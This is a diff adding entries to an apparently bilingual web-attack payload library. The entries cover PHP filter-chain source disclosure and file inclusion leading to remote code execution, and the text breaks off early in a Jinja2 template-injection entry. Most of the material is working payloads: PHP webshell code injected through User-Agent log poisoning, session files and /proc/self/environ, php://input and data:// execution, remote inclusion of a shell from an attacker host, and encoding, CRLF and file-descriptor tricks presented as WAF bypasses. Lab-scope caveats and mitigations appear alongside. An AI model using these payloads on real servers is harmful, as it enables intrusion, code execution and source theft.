+            "zh": "绕过对单次转换特征的检测：两轮字符集往返改变字节形态；按最终编码解读即成功。",
+            "en": "Round-trip charsets twice past single-transform signatures; interpreting the final encoding confirms success."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "convert.iconv.utf-8.utf-16",
+              "explanation": {
+                "zh": "UTF16转换环节",
+                "en": "UTF-16 conversion stage"
+              },
+              "type": "function"
+            },
+            {
+              "part": "convert.iconv.utf-16.utf-8",
+              "explanation": {
+                "zh": "UTF8回转环节",
+                "en": "UTF-8 round-trip stage"
+              },
+              "type": "function"
+            },
+            {
+              "part": "|",
+              "explanation": {
+                "zh": "过滤器链分隔",
+                "en": "Filter chain separator"
+              },
+              "type": "operator"
+            }
+          ]
+        },
+        {
+          "title": {
+            "zh": "小写化加编码链",
+            "en": "Lowercase-Plus-Encoding Chain"
+          },
+          "command": "php://filter/read=string.tolower|convert.base64-encode/resource=index.php",
+          "description": {
+            "zh": "绕过对 convert 直接开头的规则：前置小写化过滤器；解码后按需还原大小写即成功。",
+            "en": "Prefix a lowercase filter before encoding past convert-leading rules; restoring case after decoding confirms success."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "string.tolower",
+              "explanation": {
+                "zh": "小写化过滤器",
+                "en": "Lowercase filter"
+              },
+              "type": "function"
+            },
+            {
+              "part": "convert.base64-encode",
+              "explanation": {
+                "zh": "Base64编码过滤器",
+                "en": "Base64 encoding filter"
+              },
+              "type": "function"
+            },
+            {
+              "part": "resource=index.php",
+              "explanation": {
+                "zh": "被读源码资源",
+                "en": "Source resource being read"
+              },
+              "type": "flag"
+            }
+          ]
+        },
+        {
+          "title": {
+            "zh": "UTF-7 输出转换",
+            "en": "UTF-7 Output Transform"
+          },
+          "command": "php://filter/convert.iconv.utf-8.utf-7/resource=index.php",
+          "description": {
+            "zh": "绕过对 utf-16 组合特征库：改走 UTF-7 输出通道；按 UTF-7 解码即得源码。",
+            "en": "Emit through UTF-7 instead, past utf-16 signature lists; decoding as UTF-7 yields the source."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "convert.iconv.utf-8.utf-7",
+              "explanation": {
+                "zh": "UTF7输出转换",
+                "en": "UTF-7 output transform"
+              },
+              "type": "function"
+            },
+            {
+              "part": "php://filter/",
+              "explanation": {
+                "zh": "过滤器包装器前缀",
+                "en": "Filter wrapper prefix"
+              },
+              "type": "url"
+            },
+            {
+              "part": "resource=index.php",
+              "explanation": {
+                "zh": "被读源码资源",
+                "en": "Source resource being read"
+              },
+              "type": "flag"
+            }
+          ]
+        },
+        {
+          "title": {
+            "zh": "filter 嵌套双层编码链",
+            "en": "Nested Double-Filter Chain"
+          },
+          "command": "php://filter/convert.base64-encode/resource=php://filter/convert.base64-encode/resource=config.php",
+          "description": {
+            "zh": "resource 参数本身指向另一段 php://filter，内层先把 config.php 源码 base64 化为纯文本，外层再编码一次形成双层输出；嵌套形态绕过按「单段 base64 过滤器与敏感路径连写」特征编写的规则，也使内容审计无法直接命中源码或单层 base64 签名。命中判据：响应为双层 base64，解码两次得到源码。",
+            "en": "The resource parameter itself points at a second php://filter stream: the inner layer base64-encodes the config.php source into plain text and the outer layer encodes it again, producing double-wrapped output; the nested form evades rules keyed on a single base64 filter chained with a sensitive path and keeps content audits from matching either raw source or single-layer base64 signatures. Success: the response is double-encoded and yields the source after two decodes."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "php://filter/convert.base64-encode/resource=",
+              "explanation": {
+                "zh": "外层过滤器与资源指向",
+                "en": "Outer filter with its resource pointer"
+              },
+              "type": "keyword"
+            },
+            {
+              "part": "php://filter/convert.base64-encode/resource=config.php",
+              "explanation": {
+                "zh": "内层过滤器嵌套为外层资源",
+                "en": "Inner filter nested as the outer resource"
+              },
+              "type": "payload"
+            }
+          ],
+          "platform": "all",
+          "requiresAdmin": false,
+          "kind": "bypass",
+          "effectiveness": "B"
+        }
+      ],
+      "attackChain": [
+        {
+          "title": {
+            "zh": "确认LFI与过滤限制",
+            "en": "Confirm LFI and filtering limits"
+          },
+          "description": {
+            "zh": "验证参数可读取本地文件并观察是否存在关键字拦截，记录被拒形式，即选定转换链绕过路线。",
+            "en": "Verify local reads and note keyword blocks; the rejected shapes select the transform-chain route."
+          },
+          "payload": "php://filter/read=string.rot13/resource=index.php\nphp://filter/convert.iconv.utf-8.utf-16/resource=index.php\nphp://filter/zlib.deflate/convert.base64-encode/resource=index.php\nphp://filter/resource=index.php"
+        },
+        {
+          "title": {
+            "zh": "用转换链读取源码",
+            "en": "Read source through transform chains"
+          },
+          "description": {
+            "zh": "用执行区载荷提交rot13、iconv与zlib组合的filter URI，响应内容按对应算法可还原成源码即确认转换链生效。",
+            "en": "Submit the rot13, iconv, and zlib filter URIs per the execution payload; output reversing to source confirms the chain."
+          },
+          "payload": "php://filter/read=string.rot13/resource=index.php\nphp://filter/convert.iconv.utf-8.utf-16/resource=index.php\nphp://filter/zlib.deflate/convert.base64-encode/resource=index.php\nphp://filter/resource=index.php"
+        },
+        {
+          "title": {
+            "zh": "解码内容挖掘深层漏洞",
+            "en": "Decode output to mine deeper flaws"
+          },
+          "description": {
+            "zh": "按链式逆运算还原读取结果，查找包含点与命令执行入口，复验成功即把读取能力转化为执行路径。",
+            "en": "Reverse the transforms to recover content and hunt includes and command sinks; a confirmed flaw converts read into execution."
+          },
+          "payload": ""
+        }
+      ],
+      "references": [
+        "https://www.php.net/manual/en/filters.php",
+        "https://www.php.net/manual/en/stream.filters.php"
+      ],
+      "tutorial": {
+        "overview": {
+          "zh": "LFI PHP Filter 转换边界针对过滤链实际输出与资源读取边界的验证场景：ROT13、字符集转换与压缩加 Base64 各自产出不同形态。验证四条 filter URI 与离线预期字节的比对。",
+          "en": "The LFI PHP filter transformation boundary targets validating actual filter-chain output and resource-read boundaries: ROT13, charset conversion, and compression-plus-Base64 each yield different forms. It compares four filter URIs against offline expected bytes."
+        },
+        "vulnerability": {
+          "zh": "当用户能控制 resource 和 filter 链且文件根目录未受约束时，应用可能以变换后的形式泄露本地内容或绕过简单响应检查；仅收到乱码、空响应或 PHP warning 不证明目标文件被读取。",
+          "en": "When users control resource and filter chain without file-root constraints, the application may leak local content in transformed form or bypass simple response checks; garbled output, empty responses, or PHP warnings alone do not prove the target file was read."
+        },
+        "exploitation": {
+          "zh": "按第 1 步把四条 filter URI 中的 index.php 替换为隔离标记资源，按原顺序逐条执行并离线计算每条链的预期输出字节；命中判据为转换后字节与离线预期完全一致，证明过滤器链被应用且资源读取受控可复现。不带显式转换的最后一条作为解析对照，不自动视为绕过；全部比对结果记录为转换基线，用于后续检测规则验证。",
+          "en": "Per step 1, replace index.php in the four filter URIs with an isolated marker resource, execute them in original order, and compute each chain's expected output bytes offline; a hit is transformed bytes exactly matching offline expectations, proving the filter chain applied and resource reads are reproducibly controlled. The final URI without explicit conversion serves as a parsing control, not automatically a bypass; record all comparison results as transformation baselines for later detection-rule validation."
+        },
+        "mitigation": {
+          "zh": "外部输入只选预定义对象与转换项，服务端组装固定 filter 链并校验根目录：\n    $F = ['a'=>'data/a.txt']; $M = ['b64'=>'convert.base64-encode'];\n    $res = $F[$_GET['id'] ? ''] ? null; $flt = $M[$_GET['fmt'] ? ''] ? null;\n    if (!$res || !$flt) exit(http_response_code(400));\n    $path = realpath(APP_ROOT.'/'.$res);\n    if (!$path || !str_starts_with($path, APP_ROOT)) exit;\n    fpassthru(stream_filter_append(fopen($path, 'r'), $flt, STREAM_FILTER_READ));",
+          "en": "Let external input select only predefined file objects and transformation options; assemble fixed filter chains server-side and verify canonical paths stay within the root; never allow arbitrary wrappers, filter names, or resources. After the fix, replay the step-1 URIs and compare all transformation baselines, confirming arbitrary chains are rejected while normal transformation features work."
+        },
+        "difficulty": "advanced"
+      },
+      "analysis": {
+        "zh": "阳性必须把特定 filter 输出与同一标记资源的文件读取关联起来。乱码、Base64 外观、warning、空响应或最后一条无转换 URI 的处理差异都只是诊断信号，不能单独证明 LFI。",
+        "en": "A positive must correlate a specific filter output with a read of the same marker resource. Garbled data, a Base64 appearance, warnings, empty responses, or differential handling of the no-transform control are diagnostic signals and cannot alone prove LFI."
+      },
+      "review": {
+        "decision": "payload",
+        "rationale": "WAF2 批次3：按报告 WAF2-0059 缺口方向（php://filter 嵌套）自造 resource 指向二级 filter 的双层编码链变体；原 3 条逐字节保留，新变体只追加末尾。"
+      }
+    },
+    {
+      "id": "rce-include",
+      "name": {
+        "zh": "服务端文件包含到 RCE",
+        "en": "File Inclusion to RCE"
+      },
+      "description": {
+        "zh": "覆盖服务端文件包含的执行边界验证：从日志、会话与环境变量文件包含，到 php://input 与 data:// 包装器执行，再到远程文件包含，用于确认包含点到代码执行的可用路径。",
+        "en": "Covers execution-boundary validation of server-side file inclusion: from log, session, and environment-variable file inclusion through php://input and data:// wrapper execution to remote file inclusion, confirming viable paths from inclusion to code execution."
+      },
+      "category": {
+        "zh": "RCE远程代码执行",
+        "en": "RCE Remote Code Execution"
+      },
+      "subCategory": {
+        "zh": "文件包含与包装器",
+        "en": "File Inclusion & Stream Wrappers"
+      },
+      "tags": [
+        "rce",
+        "include",
+        "lfi",
+        "rfi"
+      ],
+      "prerequisites": [
+        {
+          "zh": "确认 服务端文件包含沙箱边界 的目标、账号、数据、组件版本和停止条件均属于可回滚的授权实验范围。",
+          "en": "Confirm that the target, accounts, data, component version, and stop conditions for Server-Side Include Sandbox Boundary are inside a reversible authorized lab scope."
+        },
+        {
+          "zh": "准备正常输入、唯一标记、服务端日志和阴性对照；禁止扩展到非实验资产、真实凭据或不可回滚状态。",
+          "en": "Prepare normal input, a unique marker, server logs, and a negative control; do not expand to non-lab assets, real credentials, or irreversible state."
+        }
+      ],
+      "execution": [
+        {
+          "title": {
+            "zh": "日志文件包含执行",
+            "en": "Include and run via log files"
+          },
+          "command": "User-Agent: <?php system($_GET['cmd']);?>\n?file=/var/log/apache2/access.log&cmd=whoami\n?file=/var/log/nginx/access.log&cmd=whoami",
+          "description": {
+            "zh": "在 User-Agent 中植入 PHP 代码后包含 Apache/Nginx 访问日志，验证被记录进日志的代码在包含时执行。命中判据：携带 cmd=whoami 包含日志后响应输出当前用户名。",
+            "en": "Plant PHP code in the User-Agent, then include the Apache/Nginx access log, verifying logged code executes on inclusion. Success check: including the log with cmd=whoami prints the current username."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "/var/log/apache2/access.log",
+              "explanation": {
+                "zh": "Apache访问日志",
+                "en": "Apache Access Log"
+              },
+              "type": "path"
+            },
+            {
+              "part": "/var/log/nginx/access.log",
+              "explanation": {
+                "zh": "Nginx访问日志",
+                "en": "Nginx Access Log"
+              },
+              "type": "path"
+            }
+          ],
+          "platform": "linux",
+          "requiresAdmin": false
+        },
+        {
+          "title": {
+            "zh": "会话文件包含执行",
+            "en": "Include and run via session files"
+          },
+          "command": "?file=/var/lib/php/sessions/sess_{PHPSESSID}\n<?php system($_GET['cmd']);?>",
+          "description": {
+            "zh": "包含 sess_[PHPSESSID] 会话文件让其中注入的 PHP 代码执行，验证会话存储路径可控时的包含执行。命中判据：携带 cmd=whoami 包含会话文件后响应输出当前用户名。",
+            "en": "Include the sess_[PHPSESSID] session file so injected PHP code runs, verifying inclusion-based execution via session storage. Success check: including the session file with cmd=whoami prints the current username."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "system()",
+              "explanation": {
+                "zh": "系统命令执行",
+                "en": "System Commands Execute"
+              },
+              "type": "function"
+            }
+          ],
+          "platform": "linux",
+          "requiresAdmin": false
+        },
+        {
+          "title": {
+            "zh": "环境变量文件包含执行",
+            "en": "Include and run via /proc/self/environ"
+          },
+          "command": "User-Agent: <?php system($_GET['cmd']);?>\n?file=/proc/self/environ&cmd=whoami",
+          "description": {
+            "zh": "把 PHP 代码放入 User-Agent 后包含 /proc/self/environ，验证随请求注入的环境变量在包含时执行。命中判据：包含 /proc/self/environ 后响应输出当前用户名。",
+            "en": "Place PHP code in the User-Agent and include /proc/self/environ, verifying request-injected environment variables execute on inclusion. Success check: including /proc/self/environ prints the current username."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "system()",
+              "explanation": {
+                "zh": "系统命令执行",
+                "en": "System Commands Execute"
+              },
+              "type": "function"
+            }
+          ],
+          "platform": "linux",
+          "requiresAdmin": false
+        },
+        {
+          "title": {
+            "zh": "php://input 与 data:// 执行",
+            "en": "php://input and data:// execution"
+          },
+          "command": "# php://input\n?file=php://input\nPOST: <?php system('whoami');?>\n?file=data://text/plain,<?php system('whoami');?>\n?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCd3aG9hbWknKTs/Pg==",
+          "description": {
+            "zh": "判据: 以 php://input 原始输入流与 data:// 文本/base64 内联流作为包含目标（两者均要求 allow_url_include=On），验证请求体和内联数据可直接按 PHP 执行。命中判据：php://input 请求体或 data:// 内联流被包含执行后输出 whoami 的当前用户名。",
+            "en": "Use the php://input raw stream and data:// text/base64 inline streams as inclusion targets, verifying request bodies and inline data run as PHP. Success check: after the php://input body or data:// inline stream is included and executed, whoami prints the current username."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "system()",
+              "explanation": {
+                "zh": "执行系统命令",
+                "en": "Execute system commands"
+              },
+              "type": "function"
+            },
+            {
+              "part": "php://input",
+              "explanation": {
+                "zh": "PHP原始输入流",
+                "en": "PHP raw input stream"
+              },
+              "type": "technique"
+            }
+          ],
+          "platform": "all",
+          "requiresAdmin": false
+        },
+        {
+          "title": {
+            "zh": "远程文件包含执行",
+            "en": "Remote file inclusion execution"
+          },
+          "command": "?file=http://{ATTACKER_HOST}/shell.txt\n<?php system($_GET['cmd']);?>",
+          "syntaxBreakdown": [
+            {
+              "part": "system()",
+              "explanation": {
+                "zh": "系统命令执行",
+                "en": "System Commands Execute"
+              },
+              "type": "function"
+            }
+          ],
+          "platform": "all",
+          "requiresAdmin": false,
+          "description": {
+            "zh": "让 file 参数加载攻击者服务器上的 shell.txt 并执行其中 PHP 代码，验证 allow_url_include 开启时的远程包含。命中判据：攻击者 HTTP 日志出现 shell.txt 请求且响应包含命令输出。",
+            "en": "Have the file parameter load shell.txt from the attacker server and run its PHP code, verifying RFI when allow_url_include is on. Success check: the attacker HTTP log records the shell.txt request and the response contains command output."
+          }
+        }
+      ],
+      "opsecTips": [
+        {
+          "zh": "包含路径限定实验文件与会话——远程包含只指向实验 HTTP 服务；日志包含验证后清理注入行。",
+          "en": "Confine include paths to lab files and sessions, point remote inclusion at the lab HTTP service only, and clean injected lines from logs after verification."
+        },
+        {
+          "zh": "出现真实凭据、非实验数据、不可逆写入或非授权连接时立即停止并清理夹具。",
+          "en": "Stop immediately and clean up the fixture on real credentials, non-lab data, irreversible writes, or unauthorized connections."
+        }
+      ],
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "URL 编码日志路径绕过",
+            "en": "Bypass with a URL-encoded log path"
+          },
+          "command": "?file=%2fvar%2flog%2fapache2%2faccess.log",
+          "description": {
+            "zh": "以百分号编码形式传递日志包含路径，验证仅匹配明文 /var/log 路径的过滤规则可被编码绕过。命中判据：编码形式返回与明文路径相同的日志内容。",
+            "en": "Pass the log-inclusion path percent-encoded, verifying filters matching only the plaintext /var/log path can be evaded. Success check: the encoded form returns the same log content as the plaintext path."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "?file=%2fvar%2flog%2fapache2%2faccess.log\nURL编码路径",
+              "explanation": {
+                "zh": "攻击载荷",
+                "en": "Attack Payload"
+              },
+              "type": "value"
+            }
+          ],
+          "platform": "all",
+          "requiresAdmin": false
+        },
+        {
+          "title": {
+            "zh": "编码绕过",
+            "en": "Encoding Bypass"
+          },
+          "command": "?file=%2f%76%61%72%2f%6c%6f%67%2f%61%70%61%63%68%65%32%2f%61%63%63%65%73%73%2e%6c%6f%67\n?file=%25%32%66%25%37%36%25%36%31%25%37%32%25%32%66%25%36%63%25%36%66%25%36%37%25%32%66%25%36%31%25%37%30%25%36%31%25%36%33%25%36%38%25%36%35%25%33%32%25%32%66%25%36%31%25%36%33%25%36%33%25%36%35%25%37%33%25%37%33%25%32%65%25%36%63%25%36%66%25%36%37\n?file=php://filter/convert.base64-encode/resource=/var/log/apache2/access.log",
+          "description": {
+            "zh": "以单次 URL 编码、双重 URL 编码与 base64 过滤器读取三种形式呈现同一日志路径，验证仅匹配明文路径或只做一次解码的过滤可被绕过。",
+            "en": "Present the same log path as single URL-encoded, double URL-encoded, and base64-filter forms, verifying filters that match plaintext or decode only once can be bypassed."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "使用URL编码或Base64编码绕过关键字过滤",
+              "explanation": {
+                "zh": "攻击载荷",
+                "en": "AttackPayload"
+              },
+              "type": "value"
+            }
+          ],
+          "platform": "all",
+          "requiresAdmin": false
+        },
+        {
+          "title": {
+            "zh": "投毒 User-Agent 并经 LFI 包含访问日志",
+            "en": "Poison the User-Agent and include the access log via LFI"
+          },
+          "command": "curl -A \"<?php eval($_REQUEST['cmd']);?>\" http://{LAB_APP}/\n?file=/var/log/apache2/access.log&cmd=whoami\n?file=/var/log/httpd/access_log&cmd=whoami",
+          "description": {
+            "zh": "以带 PHP eval 标记的 User-Agent 请求目标使其写入访问日志，再经文件包含参数加载该日志并传入 cmd 参数验证代码执行。命中判据：包含日志并传入 cmd=whoami 后响应输出当前用户名。",
+            "en": "Send a PHP-tagged User-Agent that is written to the access log, then include the log through the file parameter and pass a cmd parameter to verify execution. Success check: including the log with cmd=whoami prints the current username."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "/var/log/apache2/access.log",
+              "explanation": {
+                "zh": "Debian/Ubuntu日志路径",
+                "en": "Debian/Ubuntu Log Path"
+              },
+              "type": "path"
+            },
+            {
+              "part": "/var/log/httpd/access_log",
+              "explanation": {
+                "zh": "CentOS/RHEL日志路径",
+                "en": "Cent OS/RHEL Log Path"
+              },
+              "type": "path"
+            }
+          ],
+          "platform": "linux",
+          "requiresAdmin": false
+        },
+        {
+          "title": {
+            "zh": "对 Nginx 日志路径重复包含验证",
+            "en": "Repeat inclusion against the Nginx log path"
+          },
+          "command": "curl -A \"<?php eval($_REQUEST['cmd']);?>\" http://{LAB_APP}/\n?file=/var/log/nginx/access.log&cmd=whoami",
+          "syntaxBreakdown": [
+            {
+              "part": "system()",
+              "explanation": {
+                "zh": "系统命令执行",
+                "en": "System Commands Execute"
+              },
+              "type": "function"
+            },
+            {
+              "part": "curl",
+              "explanation": {
+                "zh": "HTTP请求工具",
+                "en": "HTTP Request Tools"
+              },
+              "type": "command"
+            }
+          ],
+          "platform": "all",
+          "requiresAdmin": false,
+          "description": {
+            "zh": "对 Nginx 访问日志路径重复同一包含流程，确认不同服务器日志布局下的包含可达性。命中判据：Nginx 日志包含后同样返回命令输出。",
+            "en": "Repeat the same inclusion flow against the Nginx access log path to confirm reachability across server log layouts. Success check: including the Nginx log likewise returns command output."
+          }
+        },
+        {
+          "title": {
+            "zh": "CRLF 日志行截断注入",
+            "en": "CRLF Log-Line Truncation"
+          },
+          "command": "curl -A $'<?php system($_GET[1]);?>\\r\\nX-Clean: PAYLOADER_MARKER' \"http://{LAB_APP}/\"\n?file=/var/log/apache2/access.log&1=whoami",
+          "description": {
+            "zh": "在 User-Agent 载荷内写 \\r\\n 把 PHP 代码截成日志中独立的一行，后续伪头行吸收日志尾部的引号与 HTTP/1.1 噪声，被包含页不再有前缀引号污染；\\r\\n 本身还可绕过按 UA 单行特征编写的检测。命中判据：包含 access.log 并传 1=whoami 后响应仅输出命令结果。",
+            "en": "A CRLF sequence written inside the User-Agent payload splits the PHP code into its own log line while the following pseudo-header line absorbs the trailing quote and HTTP/1.1 noise, so the included page renders without prefix pollution; the same CRLF also evades detections keyed on single-line UA signatures. Success: including access.log with 1=whoami prints only the command output."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "-A $'<?php system($_GET[1]);?>",
+              "explanation": {
+                "zh": "ANSI-C 引号携带 PHP 载荷",
+                "en": "ANSI-C quoting carries the PHP payload"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "\\r\\nX-Clean: PAYLOADER_MARKER",
+              "explanation": {
+                "zh": "回车换行截断日志行并吸收尾部噪声",
+                "en": "CRLF truncates the log line and absorbs trailing noise"
+              },
+              "type": "operator"
+            },
+            {
+              "part": "?file=/var/log/apache2/access.log&1=whoami",
+              "explanation": {
+                "zh": "包含日志并传参验证执行",
+                "en": "Include the log and pass the parameter to verify execution"
+              },
+              "type": "payload"
+            }
+          ],
+          "platform": "linux",
+          "requiresAdmin": false,
+          "kind": "bypass",
+          "effectiveness": "B"
+        },
+        {
+          "title": {
+            "zh": "proc fd 句柄复用读取",
+            "en": "proc self fd Handle Reuse"
+          },
+          "command": "?file=/proc/self/fd/3\n?file=/proc/self/fd/4\n?file=/proc/self/fd/5\n?file=/proc/self/fd/6&cmd=whoami",
+          "description": {
+            "zh": "进程已打开的访问日志与错误日志在 /proc/self/fd/N 下有数字别名，包含 fd 别名可完全避开对 /var/log 完整路径的黑名单；fd 编号随服务端打开顺序浮动，需按 3-6 逐个探测，命中日志句柄后经 cmd 参数验证代码执行。命中判据：某一 fd 返回日志内容，末行返回 whoami 结果。",
+            "en": "Already-open access and error logs have numeric aliases under the proc self-fd tree, so including the fd alias bypasses blacklists on full /var/log paths entirely; fd numbers drift with the open order of the server and need probing across 3-6, and once the log handle is found the trailing cmd parameter verifies execution. Success: one fd returns log contents and the last line returns the whoami output."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "?file=/proc/self/fd/3",
+              "explanation": {
+                "zh": "fd 数字别名探测起点",
+                "en": "Numeric fd alias probe start"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "?file=/proc/self/fd/4",
+              "explanation": {
+                "zh": "编号随打开顺序浮动需逐个探测",
+                "en": "Numbers drift with open order and need stepwise probing"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "&cmd=whoami",
+              "explanation": {
+                "zh": "命中日志句柄后验证执行",
+                "en": "Verifies execution after the log handle is hit"
+              },
+              "type": "payload"
+            }
+          ],
+          "platform": "linux",
+          "requiresAdmin": false,
+          "kind": "bypass",
+          "effectiveness": "B"
+        }
+      ],
+      "attackChain": [
+        {
+          "title": {
+            "zh": "投毒日志包含执行",
+            "en": "Poison and include logs"
+          },
+          "description": {
+            "zh": "在 User-Agent 植入 PHP 代码请求目标写入日志，再经包含参数加载日志并传 cmd。命中判据：响应输出当前用户名。",
+            "en": "Plant PHP code in User-Agent, then include the access log with a cmd parameter. Success: the response prints the username."
+          },
+          "payload": ""
+        },
+        {
+          "title": {
+            "zh": "会话文件包含执行",
+            "en": "Execute via session files"
+          },
+          "description": {
+            "zh": "向会话写入代码后包含 sess_[PHPSESSID] 文件，/proc/self/environ 可用同样思路投毒。命中判据：命令输出返回响应。",
+            "en": "Write code into the session then include sess_[PHPSESSID]; /proc/self/environ works the same way. Success: command output returns."
+          },
+          "payload": "?file=/var/lib/php/sessions/sess_{PHPSESSID}\n<?php system($_GET['cmd']);?>"
+        },
+        {
+          "title": {
+            "zh": "输入流与内联数据执行",
+            "en": "Execute via input and inline streams"
+          },
+          "description": {
+            "zh": "用 php://input 请求体与 data:// 文本或 Base64 内联流直接承载代码执行。命中判据：输出 whoami 命令结果。",
+            "en": "Carry code in the php://input body or data:// inline streams. Success: whoami output is returned."
+          },
+          "payload": ""
+        },
+        {
+          "title": {
+            "zh": "远程包含建立控制",
+            "en": "Gain control via remote inclusion"
+          },
+          "description": {
+            "zh": "让 file 参数加载攻击者服务器上的脚本，建立可持续的执行入口。命中判据：HTTP 日志出现脚本请求且命令执行。",
+            "en": "Point file at a script hosted by the attacker for a lasting entry. Success: HTTP logs show the fetch and commands run."
+          },
+          "payload": "?file=http://{ATTACKER_HOST}/shell.txt\n<?php system($_GET['cmd']);?>"
+        },
+        {
+          "title": {
+            "zh": "编码路径绕过拦截",
+            "en": "Bewilder filters with encoded paths"
+          },
+          "description": {
+            "zh": "日志路径被拦截时用 URL 编码与双重编码变形后提交包含请求。命中判据：编码后的路径包含成功并执行代码。",
+            "en": "When log paths are blocked, submit URL-encoded and double-encoded variants. Success: the encoded include executes."
+          },
+          "payload": ""
+        }
+      ],
+      "references": [
+        "https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html",
+        "https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html"
+      ],
+      "tutorial": {
+        "overview": {
+          "zh": "服务端文件包含沙箱边界针对包含参数可加载任意本地或远程资源并按 PHP 执行的场景。覆盖日志、会话、环境变量三类载体包含，php://input 与 data:// 包装器执行，以及远程文件包含五类利用路径。",
+          "en": "The server-side file-inclusion sandbox boundary targets inclusion parameters that can load arbitrary local or remote resources and execute them as PHP. It covers five exploitation paths: log, session, and environment-variable carriers; php://input and data:// wrapper execution; and remote file inclusion."
+        },
+        "vulnerability": {
+          "zh": "根因是用户输入直接决定 include/require 的目标且未限制 scheme 与根目录，任意可读文件、流包装器或远程 URL 的内容被当作 PHP 源码解释，注入其中的代码随包含执行。",
+          "en": "The root cause is user input directly determining the include/require target without scheme or root restrictions; content of any readable file, stream wrapper, or remote URL is interpreted as PHP source, and code planted inside executes on inclusion."
+        },
+        "exploitation": {
+          "zh": "按 Payload 列表顺序使用：第 1 步在 User-Agent 植入 PHP 并包含访问日志，cmd=whoami 后出现用户名即确认；日志不可用改用第 2 步会话文件或第 3 步 /proc/self/environ；流语义可用时第 4 步经 php://input 或 data:// 直接投递；allow_url_include 开启时第 5 步加载远程 shell.txt。日志路径被拦时改用 URL 编码变体。",
+          "en": "Use payloads in list order: plant PHP in the User-Agent and include the access log per step 1—a username after cmd=whoami confirms it; if logs are unavailable, switch to step 2's session file or step 3's /proc/self/environ; with stream semantics, deliver code directly via step 4's php://input or data://; with allow_url_include on, load remote shell.txt per step 5. Use URL-encoded variants when log paths are blocked."
+        },
+        "mitigation": {
+          "zh": "模板加载使用服务端 ID 映射，禁止用户输入进入 include/require；限制文件根目录与 scheme，关闭 allow_url_include，日志与会话目录不放入可包含路径：\n      $templates = ['header' => '/tpl/header.php', 'footer' => '/tpl/footer.php'];\n      $tpl = $templates[$_GET['t']] ? exit('unknown template');\n      include $tpl; // 只包含白名单内服务端文件\n      // php.ini\n      allow_url_include = Off\n  修复后重放第 1-5 步载体（日志/会话/包装器），全部被拒绝且正常模板可用。",
+          "en": "Load templates via server-side ID mapping and keep user input out of include/require; confine file roots and schemes, disable allow_url_include, and keep log and session directories off includable paths. After the fix, replay the step 1-5 carriers and confirm all are rejected while normal templates work."
+        },
+        "difficulty": "advanced"
+      },
+      "analysis": {
+        "zh": "服务端文件包含沙箱边界只有在唯一输入、最终解析或授权结果、服务端日志和可观察影响相互一致时才能确认。单一状态码、超时、错误文本、客户端显示或工具猜测只应作为线索，必须保留阴性对照和版本条件。",
+        "en": "Server-Side Include Sandbox Boundary is confirmed only when the unique input, final parsing or authorization result, server-side logs, and observable impact agree. A status code, timeout, error string, client display, or tool guess is only a lead; retain a negative control and exact version prerequisites."
+      },
+      "relatedExploits": [
+        {
+          "id": "EXP-01M3HAAV4J0G4VQSKCEZP3P6Y0",
+          "name": "ThinkPHP 5.x 路由正则缺陷远程代码执行",
+          "source": "curated"
+        },
+        {
+          "id": "EXP-01M3HAAV4JZZX5HAY65RQSQZDS",
+          "name": "ThinkPHP 多语言特性本地文件包含远程代码执行",
+          "source": "curated"
+        },
+        {
+          "id": "EXP-01M3HHV7XPZC2RT0KGJKHNYK2Z",
+          "name": "ABB Cylon Aspect 3.07.02 (userManagement.php) - Weak Password Policy",
+          "source": "exploit-db"
+        }
+      ],
+      "review": {
+        "decision": "payload",
+        "rationale": "WAF2 批次3：按报告 WAF2-0059 候选2（CRLF 日志行截断，全文）与缺口方向（proc 句柄复用，自造）追加 2 条变体；原 4 条逐字节保留，新变体只追加末尾。"
+      }
+    },
+    {
+      "id": "ssti-jinja2",
+      "name": {
+        "zh": "Jinja2 模板注入检测",
+        "en": "Jinja2 SSTI Detection"
+      },
+      "description": {
+        "zh": "使用无副作用算术、字符串、变量和控制结构 marker，验证 Jinja 是否把非可信输入当作模板源码求值，并区分普通变量插值与模板注入。",
+        "en": "Use side-effect-free arithmetic, string, variable, and control-flow markers to test whether Jinja evaluates untrusted input as template source and distinguish ordinary interpolation from template injection."
+      },
+      "category": {
+        "zh": "SSTI模板注入",
+        "en": "SSTI Template Injection"
+      },
+      "subCategory": {
+        "zh": "Jinja2 与 Python 系",
+        "en": "Jinja2 & Python Family"
+      },
+      "tags": [
+        "ssti",
+        "jinja2",
+        "twig",
+        "template"
+      ],
+      "prerequisites": [
+        {
+          "zh": "使用无网络出口的本地 Jinja Fixture，并记录引擎版本、模板入口和启用的扩展或安全模式。",
+          "en": "Use a no-egress local Jinja fixture and record engine version, template entry, and enabled extensions or security mode."
+        },
+        {
+          "zh": "为每个请求分配唯一 marker 和 request_id，响应只返回渲染结果与模板名称，不暴露 Context 对象。",
+          "en": "Assign a unique marker and request_id to every request; responses expose only rendered output and template name, not context objects."
+        }
+      ],
+      "execution": [
+        {
+          "title": {
+            "zh": "Jinja 算术求值 Marker",
+            "en": "Jinja Arithmetic Evaluation Marker"
+          },
+          "command": "{{ 7 * 7 }}",
+          "description": {
+            "zh": "提交 {{ 7 * 7 }}，响应出现 49（而非原样回显表达式）即确认输入被 Jinja 当作模板源码求值；只比较固定预期值 49，不读取其他对象。",
+            "en": "Use a side-effect-free Jinja arithmetic evaluation marker to determine whether input becomes template source, comparing only fixed marker output."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "{{",
+              "explanation": {
+                "zh": "Jinja 表达式输出定界符开始",
+                "en": "Jinja output expression delimiter start"
+              },
+              "type": "keyword"
+            },
+            {
